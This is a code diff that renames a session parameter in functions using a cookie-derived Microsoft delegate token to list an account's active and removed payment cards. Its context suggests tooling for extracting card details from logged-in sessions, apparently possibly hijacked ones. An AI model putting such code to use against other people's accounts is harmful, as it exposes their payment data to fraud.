@@ -7,14 +7,14 @@ from authsecuring.utils.ogi.amc_headers import amc_api_headers
 rom = logging.getLogger(__name__)
 
 
-async def _via_msadelegate(session: httpx.AsyncClient) -> dict | None:
+async def _via_msadelegate(sesja: httpx.AsyncClient) -> dict | None:
     from authsecuring.utils.cookies.get_msadelegate import get_msadelegate
 
-    token = await get_msadelegate(session)
+    token = await get_msadelegate(sesja)
     if not token:
         return None
     try:
-        resp = await session.get(
+        resp = await sesja.get(
             "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
             "?status=active,removed&language=en-US&partner=northstarweb",
             headers={
@@ -70,16 +70,16 @@ async def _via_msadelegate(session: httpx.AsyncClient) -> dict | None:
     return None
 
 
-async def fetch_cards(session: httpx.AsyncClient, verification_token: str):
-    via_pi = await _via_msadelegate(session)
+async def fetch_cards(sesja: httpx.AsyncClient, verification_token: str):
+    via_pi = await _via_msadelegate(sesja)
     if via_pi is not None:
         return via_pi
 
     try:
-        cards = await session.get(
+        cards = await sesja.get(
             "https://account.microsoft.com/home/api/payment-instruments/pi-summary",
             headers=build_amc_headers(
-                session,
+                sesja,
                 verification_token,
                 qos_root="GLOBAL.HOME.PAYMENTINSTRUMENTS.GETPAYMENTINSTRUMENTSSUMMARY",
             ),
